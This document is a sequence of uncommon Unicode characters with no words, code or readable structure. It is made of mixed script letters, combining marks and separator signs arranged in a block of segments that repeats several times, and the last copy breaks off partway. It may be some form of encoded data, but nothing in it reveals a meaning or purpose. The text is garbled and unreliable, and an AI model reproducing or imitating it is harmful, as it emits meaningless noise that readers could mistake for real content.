࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬